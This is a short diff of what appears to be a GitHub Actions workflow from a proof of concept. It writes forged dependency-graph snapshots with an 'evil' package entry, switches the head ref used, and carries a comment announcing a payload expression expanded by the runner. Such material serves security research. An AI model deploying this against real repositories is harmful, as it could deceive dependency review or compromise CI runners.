@@ -38,7 +38,7 @@ jobs:
               evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
           }
           json.dump(snap(base, "refs/heads/development", base_man, "gab-base"), open("dependency-graph-reports/poc-base.json", "w"))
-          json.dump(snap(head, "refs/pull/%s/merge" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
+          json.dump(snap(head, "refs/pull/%s/head" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
           PY
           echo keep > keep.txt
         # payload expression below is expanded by the runner into the python env
